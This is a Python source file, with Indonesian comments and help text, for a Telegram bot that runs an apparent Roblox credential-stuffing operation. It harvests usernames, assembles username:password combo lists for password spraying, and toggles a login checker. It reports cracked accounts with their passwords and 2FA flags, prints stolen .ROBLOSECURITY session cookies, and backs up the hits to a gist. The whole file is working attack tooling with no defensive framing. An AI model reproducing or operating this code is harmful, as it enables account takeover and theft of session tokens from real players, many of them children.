import json, subprocess, threading, time
import urllib.error, urllib.parse, urllib.request

import backup, config, gencombo, harvest, store


def tg(token, method, params=None, timeout=60):
    url = "https://api.telegram.org/bot%s/%s" % (token, method)
    data = urllib.parse.urlencode(params or {}).encode()
    req = urllib.request.Request(url, data=data)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return json.loads(r.read().decode())
    except urllib.error.HTTPError as e:
        try:
            return json.loads(e.read().decode())
        except Exception:
            return None
    except Exception:
        return None


HELP = """svc
/probe - cek endpoint & UA
/harvest [start] [count] - panen username by ID
/users - jumlah akun terkumpul
/gen spray|deep [pwlimit] [userlimit] [cap] - rakit combo
/check on|off - mulai/stop checker
/status - progress
/hits [n] - daftar tembusan
/hit <user> - detail satu akun
/cookie <user> - token .ROBLOSECURITY
/dead [n] - combo yang udah nyerah
/retry - balikin combo dead ke pending
/reset - balikin combo running ke pending
/backup - paksa backup
/restore - tarik backup dari gist
/pw [n] - lihat contoh password list
/log [n] - ekor log
/update - git pull
kirim file .txt - auto: ada ':' = combo, tanpa ':' = password"""


class Bot:
    def __init__(self, token, owner, stop, pool):
        self.token, self.owner, self.stop, self.pool = token, owner, stop, pool
        self.offset = int(store.get_state("tg_offset") or 0)
        self.chat = owner

    def send(self, text):
        text = str(text)
        for i in range(0, max(1, len(text)), 3900):
            tg(self.token, "sendMessage",
               {"chat_id": self.chat, "text": text[i:i + 3900],
                "disable_web_page_preview": "true"})
            time.sleep(0.25)

    def run(self):
        while not self.stop.is_set():
            js = tg(self.token, "getUpdates",
                    {"offset": self.offset, "timeout": 50,
                     "allowed_updates": json.dumps(["message"])}, timeout=70)
            if not js or not js.get("ok"):
                time.sleep(3)
                continue
            for upd in js.get("result", []):
                self.offset = upd["update_id"] + 1
                store.set_state("tg_offset", self.offset)
                try:
                    self.handle(upd)
                except Exception as e:
                    self.send("err: %r" % e)

    def handle(self, upd):
        m = upd.get("message") or {}
        chat = (m.get("chat") or {}).get("id")
        if chat is None or (self.owner and chat != self.owner):
            return
        self.chat = chat

        if m.get("document"):
            return self.import_doc(m["document"])
        text = (m.get("text") or "").strip()
        if not text.startswith("/"):
            return
        a = text.split()
        c = a[0].split("@")[0].lower()
        arg = a[1:]

        if c in ("/start", "/help"):
            self.send(HELP)
        elif c == "/status":
            st = store.stats()
            self.send("users=%d hits=%d\ncombos=%s\nchecker=%s\nstats=%s" % (
                st["users"], st["hits"], st["combos"],
                "PAUSED" if self.pool.paused else "RUNNING",
                self.pool.stats))
        elif c == "/users":
            self.send("akun: %d" % store.stats()["users"])
        elif c == "/harvest":
            self._harvest(arg)
        elif c == "/gen":
            mode = arg[0] if arg else "spray"
            pw = int(arg[1]) if len(arg) > 1 else None
            us = int(arg[2]) if len(arg) > 2 else None
            cap = int(arg[3]) if len(arg) > 3 else None
            self.send("rakit combo... (mode=%s)" % mode)
            n, nu, npw = gencombo.generate(mode, pw_limit=pw, user_limit=us, cap=cap)
            self.send("jadi %d combo (%d akun x %d password)" % (n, nu, npw))
        elif c == "/check":
            v = (arg[0] if arg else "").lower()
            self.pool.paused = v != "on"
            self.send("checker %s" % ("RUNNING" if not self.pool.paused else "PAUSED"))
        elif c == "/hits":
            n = int(arg[0]) if arg else 20
            hs = store.hits(n)
            if not hs:
                self.send("belum ada tembusan")
            else:
                self.send("\n".join("%s : %s%s" % (h["username"], h["password"],
                                                   " [2FA]" if h["data"] == "2fa" else "")
                                    for h in hs))
        elif c == "/hit":
            if not arg:
                return
            h = store.get_hit(arg[0])
            if not h:
                return self.send("gak ketemu")
            self.send("%s : %s\n%s" % (h["username"], h["password"], (h["data"] or "")[:3500]))
        elif c == "/cookie":
            if not arg:
                return
            h = store.get_hit(arg[0])
            if not h:
                return self.send("gak ketemu")
            self.send("%s : %s\n\n.ROBLOSECURITY=%s" % (h["username"], h["password"], h["cookie"]))
        elif c == "/dead":
            self.send("dead=%d\n%s" % (store.stats()["combos"].get("dead", 0),
                                       "\n".join(store.dead_list(int(arg[0]) if arg else 15))))
        elif c == "/retry":
            self.send("retry %d combo" % store.retry_dead())
        elif c == "/reset":
            store.reset_running()
            self.send("ok")
        elif c == "/backup":
            self.send("backup: %s" % backup.run())
        elif c == "/restore":
            self.send("restore...")
            try:
                self.send("restore %d hits" % backup.restore())
            except Exception as e:
                self.send("restore err: %r" % e)
        elif c == "/pw":
            n = int(arg[0]) if arg else 10
            self.send("\n".join(gencombo.load_passwords()[:n]) or "kosong")
        elif c == "/log":
            n = int(arg[0]) if arg else 40
            try:
                with open(config.LOG_PATH, encoding="utf-8") as f:
                    self.send("".join(f.readlines()[-n:])[-3800:] or "kosong")
            except Exception as e:
                self.send("log err: %r" % e)
        elif c == "/probe":
            import probe
            threading.Thread(target=lambda: self.send(probe.main()), daemon=True).start()
        elif c == "/update":
            def job():
                try:
                    r = subprocess.run(["git", "-C", config.BASE, "pull", "--ff-only"],
                                       capture_output=True, text=True, timeout=60)
                    self.send("update rc=%s\n%s" % (r.returncode, (r.stdout + r.stderr)[-1500:]))
                except Exception as e:
                    self.send("update err: %r" % e)
            threading.Thread(target=job, daemon=True).start()
        else:
            self.send(HELP)

    def _harvest(self, arg):
        start = int(arg[0]) if arg else 1
        count = int(arg[1]) if len(arg) > 1 else 1000
        self.send("panen ID %d..%d" % (start, start + count))

        def job():
            got = harvest.run(start, count, self.stop)
            self.send("selesai, %d akun baru" % got)
        threading.Thread(target=job, daemon=True).start()

    def import_doc(self, doc):
        fi = tg(self.token, "getFile", {"file_id": doc["file_id"]})
        if not fi or not fi.get("ok"):
            return self.send("gagal ambil file")
        url = "https://api.telegram.org/file/bot%s/%s" % (self.token, fi["result"]["file_path"])
        raw = urllib.request.urlopen(url, timeout=120).read().decode("utf-8", "replace")
        lines = raw.splitlines()
        if any(":" in ln for ln in lines[:50]):
            rows, now, seen = [], time.time(), set()
            for line in lines:
                line = line.strip()
                if ":" not in line:
                    continue
                u, p = line.split(":", 1)
                u, p = u.strip().lower(), p.strip()
                if u and p and (u, p) not in seen:
                    seen.add((u, p))
                    rows.append((u, p, now))
            store.add_combos(rows)
            self.send("import %d combo" % len(rows))
        else:
            n = gencombo.save_passwords([ln.strip() for ln in lines if ln.strip()])
            self.send("import %d password" % n)
